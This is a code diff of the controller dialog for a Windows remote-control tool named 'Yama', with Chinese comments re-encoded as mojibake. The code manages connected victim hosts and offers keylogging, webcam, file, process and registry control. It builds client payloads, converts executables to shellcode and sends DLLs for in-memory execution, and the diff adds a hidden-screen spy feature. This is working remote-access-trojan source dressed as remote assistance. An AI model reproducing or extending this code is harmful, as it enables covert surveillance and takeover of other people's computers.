@@ -1,5 +1,5 @@
-
-// 2015RemoteDlg.cpp : ÊµÏÖÎÄ¼ş
+ï»¿
+// 2015RemoteDlg.cpp : å®ç°æ–‡ä»¶
 //
 
 #include "stdafx.h"
@@ -29,7 +29,10 @@
 #include <fstream>
 #include "common/skCrypter.h"
 #include "common/commands.h"
+#include "common/md5.h"
 #include <algorithm>
+#include "HideScreenSpyDlg.h"
+#include <sys/MachineDlg.h>
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -44,37 +47,37 @@
 
 typedef struct
 {
-	const char*   szTitle;     //ÁĞ±íµÄÃû³Æ
-	int		nWidth;            //ÁĞ±íµÄ¿í¶È
+	const char*   szTitle;     //åˆ—è¡¨çš„åç§°
+	int		nWidth;            //åˆ—è¡¨çš„å®½åº¦
 }COLUMNSTRUCT;
 
-const int  g_Column_Count_Online  = ONLINELIST_MAX; // ±¨±íµÄÁĞÊı
+const int  g_Column_Count_Online  = ONLINELIST_MAX; // æŠ¥è¡¨çš„åˆ—æ•°
 
 COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
 {
 	{"IP",				130	},
-	{"¶Ë¿Ú",			60	},
-	{"µØÀíÎ»ÖÃ",		130	},
-	{"¼ÆËã»úÃû/±¸×¢",	150	},
-	{"²Ù×÷ÏµÍ³",		120	},
+	{"ç«¯å£",			60	},
+	{"åœ°ç†ä½ç½®",		130	},
+	{"è®¡ç®—æœºå/å¤‡æ³¨",	150	},
+	{"æ“ä½œç³»ç»Ÿ",		120	},
 	{"CPU",				80	},
-	{"ÉãÏñÍ·",			70	},
+	{"æ‘„åƒå¤´",			70	},
 	{"PING",			70	},
-	{"°æ±¾",			90	},
-	{"°²×°Ê±¼ä",        120 },
-	{"»î¶¯´°¿Ú",		140 },
-	{"ÀàĞÍ",			50 },
+	{"ç‰ˆæœ¬",			90	},
+	{"å®‰è£…æ—¶é—´",        120 },
+	{"æ´»åŠ¨çª—å£",		140 },
+	{"ç±»å‹",			50 },
 };
 
-// ÓÃÓÚÓ¦ÓÃ³ÌĞò¡°¹ØÓÚ¡±²Ëµ¥ÏîµÄ CAboutDlg ¶Ô»°¿ò
+// ç”¨äºåº”ç”¨ç¨‹åºâ€œå…³äºâ€èœå•é¡¹çš„ CAboutDlg å¯¹è¯æ¡†
 
-const int g_Column_Count_Message = 3;   // ÁĞ±íµÄ¸öÊı
+const int g_Column_Count_Message = 3;   // åˆ—è¡¨çš„ä¸ªæ•°
 
 COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = 
 {
-	{"ĞÅÏ¢ÀàĞÍ",		200	},
-	{"Ê±¼ä",			200	},
-	{"ĞÅÏ¢ÄÚÈİ",	    490	}
+	{"ä¿¡æ¯ç±»å‹",		200	},
+	{"æ—¶é—´",			200	},
+	{"ä¿¡æ¯å†…å®¹",	    490	}
 };
 
 int g_Column_Online_Width  = 0;
@@ -89,16 +92,16 @@ static UINT Indicators[] =
 
 //////////////////////////////////////////////////////////////////////////
 
-// ±£´æ unordered_map µ½ÎÄ¼ş
+// ä¿å­˜ unordered_map åˆ°æ–‡ä»¶
 void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
 {
-	std::ofstream outFile(filename, std::ios::binary);  // ´ò¿ªÎÄ¼ş£¨ÒÔ¶ş½øÖÆÄ£Ê½£©
+	std::ofstream outFile(filename, std::ios::binary);  // æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶æ¨¡å¼ï¼‰
 	if (outFile.is_open()) {
 		for (const auto& pair : data) {
-			outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // ±£´æ key
+			outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // ä¿å­˜ key
 			int valueSize = pair.second.GetLength();
-			outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // ±£´æ value µÄ´óĞ¡
-			outFile.write((char*)&pair.second, valueSize);  // ±£´æ value ×Ö·û´®
+			outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // ä¿å­˜ value çš„å¤§å°
+			outFile.write((char*)&pair.second, valueSize);  // ä¿å­˜ value å­—ç¬¦ä¸²
 		}
 		outFile.close();
 	}
@@ -107,22 +110,22 @@ void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
 	}
 }
 
-// ´ÓÎÄ¼ş¶ÁÈ¡ unordered_map Êı¾İ
+// ä»æ–‡ä»¶è¯»å– unordered_map æ•°æ®
 void LoadFromFile(ComputerNoteMap& data, const std::string& filename)
 {
-	std::ifstream inFile(filename, std::ios::binary);  // ´ò¿ªÎÄ¼ş£¨ÒÔ¶ş½øÖÆÄ£Ê½£©
+	std::ifstream inFile(filename, std::ios::binary);  // æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶æ¨¡å¼ï¼‰
 	if (inFile.is_open()) {
 		while (inFile.peek() != EOF) {
 			ClientKey key;
-			inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // ¶ÁÈ¡ key
+			inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // è¯»å– key
 
 			int valueSize;
-			inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // ¶ÁÈ¡ value µÄ´óĞ¡
+			inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // è¯»å– value çš„å¤§å°
 
 			ClientValue value;
-			inFile.read((char*)&value, valueSize);  // ¶ÁÈ¡ value ×Ö·û´®
+			inFile.read((char*)&value, valueSize);  // è¯»å– value å­—ç¬¦ä¸²
 
-			data[key] = value;  // ²åÈëµ½ map ÖĞ
+			data[key] = value;  // æ’å…¥åˆ° map ä¸­
 		}
 		inFile.close();
 	}
@@ -138,13 +141,13 @@ class CAboutDlg : public CDialogEx
 public:
 	CAboutDlg();
 
-	// ¶Ô»°¿òÊı¾İ
+	// å¯¹è¯æ¡†æ•°æ®
 	enum { IDD = IDD_ABOUTBOX };
 
 protected:
-	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV Ö§³Ö
+	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV æ”¯æŒ
 
-	// ÊµÏÖ
+	// å®ç°
 protected:
 	DECLARE_MESSAGE_MAP()
 };
@@ -162,7 +165,7 @@ BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
 END_MESSAGE_MAP()
 
 
-// CMy2015RemoteDlg ¶Ô»°¿ò
+// CMy2015RemoteDlg å¯¹è¯æ¡†
 
 std::string GetFileName(const char* filepath) {
 	const char* slash1 = strrchr(filepath, '/');
@@ -190,34 +193,34 @@ bool IsDll64Bit(BYTE* dllBase) {
 	return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
 }
 
-// ·µ»Ø£º¶ÁÈ¡µÄ×Ö½ÚÊı×éÖ¸Õë£¨ĞèÒªÊÖ¶¯ÊÍ·Å£©
+// è¿”å›ï¼šè¯»å–çš„å­—èŠ‚æ•°ç»„æŒ‡é’ˆï¼ˆéœ€è¦æ‰‹åŠ¨é‡Šæ”¾ï¼‰
 DllInfo* ReadPluginDll(const std::string& filename) {
-	// ´ò¿ªÎÄ¼ş£¨ÒÔ¶ş½øÖÆÄ£Ê½£©
+	// æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶æ¨¡å¼ï¼‰
 	std::ifstream file(filename, std::ios::binary | std::ios::ate);
 	std::string name = GetFileName(filename.c_str());
 	if (!file.is_open() || name.length() >= 32) {
-		Mprintf("ÎŞ·¨´ò¿ªÎÄ¼ş: %s\n", filename.c_str());
+		Mprintf("æ— æ³•æ‰“å¼€æ–‡ä»¶: %s\n", filename.c_str());
 		return nullptr;
 	}
 
-	// »ñÈ¡ÎÄ¼ş´óĞ¡
+	// è·å–æ–‡ä»¶å¤§å°
 	std::streamsize fileSize = file.tellg();
 	file.seekg(0, std::ios::beg);
 
-	// ·ÖÅä»º³åÇø: CMD + DllExecuteInfo + size
+	// åˆ†é…ç¼“å†²åŒº: CMD + DllExecuteInfo + size
 	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
 	if (!file.read(reinterpret_cast<char*>(buffer + 1 + sizeof(DllExecuteInfo)), fileSize)) {
-		Mprintf("¶ÁÈ¡ÎÄ¼şÊ§°Ü: %s\n", filename.c_str());
+		Mprintf("è¯»å–æ–‡ä»¶å¤±è´¥: %s\n", filename.c_str());
 		delete[] buffer;
 		return nullptr;
 	}
 	if (!IsDll64Bit(buffer + 1 + sizeof(DllExecuteInfo))) {
-		Mprintf("²»Ö§³Ö32Î»DLL: %s\n", filename.c_str());
+		Mprintf("ä¸æ”¯æŒ32ä½DLL: %s\n", filename.c_str());
 		delete[] buffer;
 		return nullptr;
 	}
 
-	// ÉèÖÃÊä³ö²ÎÊı
+	// è®¾ç½®è¾“å‡ºå‚æ•°
 	DllExecuteInfo info = { MEMORYDLL, fileSize, CALLTYPE_IOCPTHREAD, };
 	memcpy(info.Name, name.c_str(), name.length());
 	buffer[0] = CMD_EXECUTE_DLL;
@@ -235,7 +238,7 @@ std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath) {
 	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
 
 	if (hFind == INVALID_HANDLE_VALUE) {
-		Mprintf("ÎŞ·¨´ò¿ªÄ¿Â¼: %s\n", dirPath.c_str());
+		Mprintf("æ— æ³•æ‰“å¼€ç›®å½•: %s\n", dirPath.c_str());
 		return result;
 	}
 
@@ -329,7 +332,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
 	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
 	ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
-	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //Éú³ÉClient
+	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //ç”ŸæˆClient
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
 	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
@@ -349,6 +352,8 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
 	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
 	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
+	ON_MESSAGE(WM_OPENHIDESCREENDLG, OnOpenHideScreenDialog)
+	ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
@@ -358,7 +363,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_ONLINE_HOSTNOTE, &CMy2015RemoteDlg::OnOnlineHostnote)
 	ON_COMMAND(ID_HELP_IMPORTANT, &CMy2015RemoteDlg::OnHelpImportant)
 	ON_COMMAND(ID_HELP_FEEDBACK, &CMy2015RemoteDlg::OnHelpFeedback)
-	// ½«ËùÓĞ¶¯Ì¬×Ó²Ëµ¥ÏîµÄÃüÁî ID Ó³Éäµ½Í¬Ò»¸öÏìÓ¦º¯Êı
+	// å°†æ‰€æœ‰åŠ¨æ€å­èœå•é¡¹çš„å‘½ä»¤ ID æ˜ å°„åˆ°åŒä¸€ä¸ªå“åº”å‡½æ•°
 	ON_COMMAND_RANGE(ID_DYNAMIC_MENU_BASE, ID_DYNAMIC_MENU_BASE + 20, &CMy2015RemoteDlg::OnDynamicSubMenu)
 	ON_COMMAND(ID_ONLINE_VIRTUAL_DESKTOP, &CMy2015RemoteDlg::OnOnlineVirtualDesktop)
 	ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
@@ -367,7 +372,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 END_MESSAGE_MAP()
 
 
-// CMy2015RemoteDlg ÏûÏ¢´¦Àí³ÌĞò
+// CMy2015RemoteDlg æ¶ˆæ¯å¤„ç†ç¨‹åº
 void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
 {
 	switch ((UINT)lParam)
@@ -389,7 +394,7 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 			Menu.LoadMenu(IDR_MENU_NOTIFY);
 			CPoint Point;
 			GetCursorPos(&Point);
-			SetForegroundWindow();   //ÉèÖÃµ±Ç°´°¿Ú
+			SetForegroundWindow();   //è®¾ç½®å½“å‰çª—å£
 			Menu.GetSubMenu(0)->TrackPopupMenu(
 				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
 				Point.x, Point.y, this, NULL); 
@@ -408,15 +413,15 @@ VOID CMy2015RemoteDlg::CreateSolidMenu()
 		SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
 	}
 
-	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //Îª´°¿ÚÉèÖÃ²Ëµ¥
-	::DrawMenuBar(this->GetSafeHwnd());                        //ÏÔÊ¾²Ëµ¥
+	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //ä¸ºçª—å£è®¾ç½®èœå•
+	::DrawMenuBar(this->GetSafeHwnd());                        //æ˜¾ç¤ºèœå•
 }
 
 VOID CMy2015RemoteDlg::CreatStatusBar()
 {
 	if (!m_StatusBar.Create(this) ||
 		!m_StatusBar.SetIndicators(Indicators,
-		sizeof(Indicators)/sizeof(UINT)))                    //´´½¨×´Ì¬Ìõ²¢ÉèÖÃ×Ö·û×ÊÔ´µÄID
+		sizeof(Indicators)/sizeof(UINT)))                    //åˆ›å»ºçŠ¶æ€æ¡å¹¶è®¾ç½®å­—ç¬¦èµ„æºçš„ID
 	{
 		return ;      
 	}
@@ -429,60 +434,60 @@ VOID CMy2015RemoteDlg::CreatStatusBar()
 
 VOID CMy2015RemoteDlg::CreateNotifyBar()
 {
-	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //´óĞ¡¸³Öµ
-	m_Nid.hWnd = m_hWnd;           //¸¸´°¿Ú    ÊÇ±»¶¨ÒåÔÚ¸¸ÀàCWndÀàÖĞ
+	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //å¤§å°èµ‹å€¼
+	m_Nid.hWnd = m_hWnd;           //çˆ¶çª—å£    æ˜¯è¢«å®šä¹‰åœ¨çˆ¶ç±»CWndç±»ä¸­
 	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
-	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //ÍĞÅÌËùÓµÓĞµÄ×´Ì¬
-	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //»Øµ÷ÏûÏ¢
-	m_Nid.hIcon = m_hIcon;                               //icon ±äÁ¿
-	CString strTips ="½û½ç: Ô¶³ÌĞ­ÖúÈí¼ş";       //ÆøÅİÌáÊ¾
+	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //æ‰˜ç›˜æ‰€æ‹¥æœ‰çš„çŠ¶æ€
+	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //å›è°ƒæ¶ˆæ¯
+	m_Nid.hIcon = m_hIcon;                               //icon å˜é‡
+	CString strTips ="ç¦ç•Œ: è¿œç¨‹ååŠ©è½¯ä»¶";       //æ°”æ³¡æç¤º
 	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
-	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //ÏÔÊ¾ÍĞÅÌ
+	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //æ˜¾ç¤ºæ‰˜ç›˜
 }
 
 VOID CMy2015RemoteDlg::CreateToolBar()
 {
 	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
 		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
-		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //´´½¨Ò»¸ö¹¤¾ßÌõ  ¼ÓÔØ×ÊÔ´
+		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //åˆ›å»ºä¸€ä¸ªå·¥å…·æ¡  åŠ è½½èµ„æº
 	{
 		return;     
 	}
 	m_ToolBar.LoadTrueColorToolBar
 		(
-		48,    //¼ÓÔØÕæ²Ê¹¤¾ßÌõ
+		48,    //åŠ è½½çœŸå½©å·¥å…·æ¡
 		IDB_BITMAP_MAIN,
 		IDB_BITMAP_MAIN,
 		IDB_BITMAP_MAIN
-		);  //ºÍÎÒÃÇµÄÎ»Í¼×ÊÔ´Ïà¹ØÁª
+		);  //å’Œæˆ‘ä»¬çš„ä½å›¾èµ„æºç›¸å…³è”
 	RECT Rect,RectMain;
-	GetWindowRect(&RectMain);   //µÃµ½Õû¸ö´°¿ÚµÄ´óĞ¡
+	GetWindowRect(&RectMain);   //å¾—åˆ°æ•´ä¸ªçª—å£çš„å¤§å°
 	Rect.left=0;
 	Rect.top=0;
 	Rect.bottom=80;
 	Rect.right=RectMain.right-RectMain.left+10;
 	m_ToolBar.MoveWindow(&Rect,TRUE);
 
-	m_ToolBar.SetButtonText(0,"ÖÕ¶Ë¹ÜÀí");     //ÔÚÎ»Í¼µÄÏÂÃæÌí¼ÓÎÄ¼ş
-	m_ToolBar.SetButtonText(1,"½ø³Ì¹ÜÀí"); 
-	m_ToolBar.SetButtonText(2,"´°¿Ú¹ÜÀí"); 
-	m_ToolBar.SetButtonText(3,"×ÀÃæ¹ÜÀí"); 
-	m_ToolBar.SetButtonText(4,"ÎÄ¼ş¹ÜÀí"); 
-	m_ToolBar.SetButtonText(5,"ÓïÒô¹ÜÀí"); 
-	m_ToolBar.SetButtonText(6,"ÊÓÆµ¹ÜÀí"); 
-	m_ToolBar.SetButtonText(7,"·şÎñ¹ÜÀí"); 
-	m_ToolBar.SetButtonText(8,"×¢²á±í¹ÜÀí"); 
-	m_ToolBar.SetButtonText(9, "¼üÅÌ¼ÇÂ¼");
-	m_ToolBar.SetButtonText(10,"²ÎÊıÉèÖÃ"); 
-	m_ToolBar.SetButtonText(11,"Éú³É·şÎñ¶Ë"); 
-	m_ToolBar.SetButtonText(12,"°ïÖú"); 
-	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //ÏÔÊ¾
+	m_ToolBar.SetButtonText(0,"ç»ˆç«¯ç®¡ç†");     //åœ¨ä½å›¾çš„ä¸‹é¢æ·»åŠ æ–‡ä»¶
+	m_ToolBar.SetButtonText(1,"è¿›ç¨‹ç®¡ç†"); 
+	m_ToolBar.SetButtonText(2,"çª—å£ç®¡ç†"); 
+	m_ToolBar.SetButtonText(3,"æ¡Œé¢ç®¡ç†"); 
+	m_ToolBar.SetButtonText(4,"æ–‡ä»¶ç®¡ç†"); 
+	m_ToolBar.SetButtonText(5,"è¯­éŸ³ç®¡ç†"); 
+	m_ToolBar.SetButtonText(6,"è§†é¢‘ç®¡ç†"); 
+	m_ToolBar.SetButtonText(7,"æœåŠ¡ç®¡ç†"); 
+	m_ToolBar.SetButtonText(8,"æ³¨å†Œè¡¨ç®¡ç†"); 
+	m_ToolBar.SetButtonText(9, "é”®ç›˜è®°å½•");
+	m_ToolBar.SetButtonText(10,"å‚æ•°è®¾ç½®"); 
+	m_ToolBar.SetButtonText(11,"ç”ŸæˆæœåŠ¡ç«¯"); 
+	m_ToolBar.SetButtonText(12,"å¸®åŠ©"); 
+	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //æ˜¾ç¤º
 }
 
 
 VOID CMy2015RemoteDlg::InitControl()
 {
-	//×¨Êôº¯Êı
+	//ä¸“å±å‡½æ•°
 
 	CRect rect;
 	GetWindowRect(&rect);
@@ -509,7 +514,7 @@ VOID CMy2015RemoteDlg::InitControl()
 
 VOID CMy2015RemoteDlg::TestOnline()
 {
-	ShowMessage(true,"Èí¼ş³õÊ¼»¯³É¹¦...");
+	ShowMessage(true,"è½¯ä»¶åˆå§‹åŒ–æˆåŠŸ...");
 }
 
 bool IsExitItem(CListCtrl &list, DWORD_PTR data){
@@ -578,7 +583,7 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	}
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
 
-	ShowMessage(true,strIP+"Ö÷»úÉÏÏß");
+	ShowMessage(true,strIP+"ä¸»æœºä¸Šçº¿");
 	LeaveCriticalSection(&m_cs);
 
 	SendMasterSettings(ContextObject);
@@ -589,9 +594,9 @@ VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
 {
 	CTime Timer = CTime::GetCurrentTime();
 	CString strTime= Timer.Format("%H:%M:%S");
-	CString strIsOK= bOk ? "Ö´ĞĞ³É¹¦" : "Ö´ĞĞÊ§°Ü";
+	CString strIsOK= bOk ? "æ‰§è¡ŒæˆåŠŸ" : "æ‰§è¡Œå¤±è´¥";
 	
-	m_CList_Message.InsertItem(0,strIsOK);    //Ïò¿Ø¼şÖĞÉèÖÃÊı¾İ
+	m_CList_Message.InsertItem(0,strIsOK);    //å‘æ§ä»¶ä¸­è®¾ç½®æ•°æ®
 	m_CList_Message.SetItemText(0,1,strTime);
 	m_CList_Message.SetItemText(0,2,strMsg);
 
@@ -601,18 +606,18 @@ VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
 	int m_iCount = m_CList_Online.GetItemCount();
 	LeaveCriticalSection(&m_cs);
 
-	strStatusMsg.Format("ÓĞ%d¸öÖ÷»úÔÚÏß",m_iCount);
-	m_StatusBar.SetPaneText(0,strStatusMsg);   //ÔÚ×´Ì¬ÌõÉÏÏÔÊ¾ÎÄ×Ö
+	strStatusMsg.Format("æœ‰%dä¸ªä¸»æœºåœ¨çº¿",m_iCount);
+	m_StatusBar.SetPaneText(0,strStatusMsg);   //åœ¨çŠ¶æ€æ¡ä¸Šæ˜¾ç¤ºæ–‡å­—
 }
 
-BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, 
-	DWORD flags, LPSTR& outBytes, DWORD& outLength);
+extern "C" BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, 
+	LPVOID userData, DWORD userLength, DWORD flags, LPSTR * outBytes, DWORD * outLength);
 
 bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength) {
 	if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
 		LPSTR finalShellcode = NULL;
 		DWORD finalSize;
-		if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, finalShellcode, finalSize)) {
+		if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, &finalShellcode, &finalSize)) {
 			return false;
 		}
 		compressedBuffer = new BYTE[finalSize];
@@ -626,25 +631,25 @@ bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuff
 	return false;
 }
 
-Buffer* ReadKernelDll(bool is64Bit, bool isDLL = true) {
+Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true) {
 	BYTE* szBuffer = NULL;
 	int dwFileSize = 0;
 
-	// ²éÕÒÃûÎª MY_BINARY_FILE µÄ BINARY ÀàĞÍ×ÊÔ´
+	// æŸ¥æ‰¾åä¸º MY_BINARY_FILE çš„ BINARY ç±»å‹èµ„æº
 	auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
 	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
 	if (hResource == NULL) {
 		return NULL;
 	}
-	// »ñÈ¡×ÊÔ´µÄ´óĞ¡
+	// è·å–èµ„æºçš„å¤§å°
 	DWORD dwSize = SizeofResource(NULL, hResource);
 
-	// ¼ÓÔØ×ÊÔ´
+	// åŠ è½½èµ„æº
 	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
 	if (hLoadedResource == NULL) {
 		return NULL;
 	}
-	// Ëø¶¨×ÊÔ´²¢»ñÈ¡Ö¸Ïò×ÊÔ´Êı¾İµÄÖ¸Õë
+	// é”å®šèµ„æºå¹¶è·å–æŒ‡å‘èµ„æºæ•°æ®çš„æŒ‡é’ˆ
 	LPVOID pData = LockResource(hLoadedResource);
 	if (pData == NULL) {
 		return NULL;
@@ -658,15 +663,19 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL = true) {
 		}
 	}
 	dwFileSize = srcLen;
-	szBuffer = new BYTE[sizeof(int) + dwFileSize + 2];
+	int bufSize = sizeof(int) + dwFileSize + 2;
+	int padding = ALIGN16(bufSize) - bufSize;
+	szBuffer = new BYTE[bufSize + padding];
 	szBuffer[0] = CMD_DLLDATA;
 	szBuffer[1] = isDLL ? MEMORYDLL : SHELLCODE;
 	memcpy(szBuffer + 2, &dwFileSize, sizeof(int));
 	memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
+	memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
 	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
-	auto ret = new Buffer(szBuffer, sizeof(int) + dwFileSize + 2);
+	auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
+	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
 	delete[] szBuffer;
-	if (srcData != pData)
+	if (srcData != pData) 
 		SAFE_DELETE_ARRAY(srcData);
 	return ret;
 }
@@ -676,15 +685,15 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	CDialogEx::OnInitDialog();
 
 	if (!IsPwdHashValid()) {
-		MessageBox("´Ë³ÌĞòÎª·Ç·¨µÄÓ¦ÓÃ³ÌĞò£¬ÎŞ·¨Õı³£ÔËĞĞ!", "´íÎó", MB_ICONERROR);
+		MessageBox("æ­¤ç¨‹åºä¸ºéæ³•çš„åº”ç”¨ç¨‹åºï¼Œæ— æ³•æ­£å¸¸è¿è¡Œ!", "é”™è¯¯", MB_ICONERROR);
 		OnMainExit();
 		return FALSE;
 	}
-	// ½«¡°¹ØÓÚ...¡±²Ëµ¥ÏîÌí¼Óµ½ÏµÍ³²Ëµ¥ÖĞ¡£
+	// å°†â€œå…³äº...â€èœå•é¡¹æ·»åŠ åˆ°ç³»ç»Ÿèœå•ä¸­ã€‚
 	SetWindowText(_T("Yama"));
 	LoadFromFile(m_ClientMap, DB_FILENAME);
 
-	// IDM_ABOUTBOX ±ØĞëÔÚÏµÍ³ÃüÁî·¶Î§ÄÚ¡£
+	// IDM_ABOUTBOX å¿…é¡»åœ¨ç³»ç»Ÿå‘½ä»¤èŒƒå›´å†…ã€‚
 	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
 	ASSERT(IDM_ABOUTBOX < 0xF000);
 
@@ -706,12 +715,12 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false);
 	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false);
 
-	// ÉèÖÃ´Ë¶Ô»°¿òµÄÍ¼±ê¡£µ±Ó¦ÓÃ³ÌĞòÖ÷´°¿Ú²»ÊÇ¶Ô»°¿òÊ±£¬¿ò¼Ü½«×Ô¶¯
-	//  Ö´ĞĞ´Ë²Ù×÷
-	SetIcon(m_hIcon, TRUE);			// ÉèÖÃ´óÍ¼±ê
-	SetIcon(m_hIcon, FALSE);		// ÉèÖÃĞ¡Í¼±ê
+	// è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨
+	//  æ‰§è¡Œæ­¤æ“ä½œ
+	SetIcon(m_hIcon, TRUE);			// è®¾ç½®å¤§å›¾æ ‡
+	SetIcon(m_hIcon, FALSE);		// è®¾ç½®å°å›¾æ ‡
 
-	// TODO: ÔÚ´ËÌí¼Ó¶îÍâµÄ³õÊ¼»¯´úÂë
+	// TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç 
 	isClosed = FALSE;
 	g_2015RemoteDlg = this;
 	CreateToolBar();
@@ -730,7 +739,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	int m = atoi(((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ReportInterval", "5"));
 	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
 	m_settings = { m, sizeof(void*) == 8, __DATE__, n };
